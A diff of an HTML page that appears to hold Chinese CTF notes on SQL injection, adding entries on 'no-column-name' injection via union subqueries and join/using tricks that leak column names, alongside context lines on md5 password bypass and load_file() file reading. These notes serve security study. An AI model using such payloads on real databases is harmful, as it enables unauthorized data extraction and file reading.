@@ -522,6 +522,12 @@ select * from &#39;admin&#39; where password=md5($pass,true);
 <p>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号</p>
 <pre><code>例如information_schema.tables和information_schema.`tables`都可以使用</code></pre>
 <p>再利用 load_file(‘path’)读取文件</p>
+<p><strong>无列名注入</strong></p>
+<p>select x.1 from (select 1,2,3(列名要刚好对应) union select * from flag)x</p>
+<p>join绕过</p>
+<p>select * from (select * from users as a join users as b)c 爆出第一个字段名</p>
+<p>select * from (select * from users as a join users as b using(id,id))c 爆出第二个</p>
+<p>select * from (select * from users as a join users as b using(id,username))c 爆第三个</p>
 
             </div>
             <hr/>
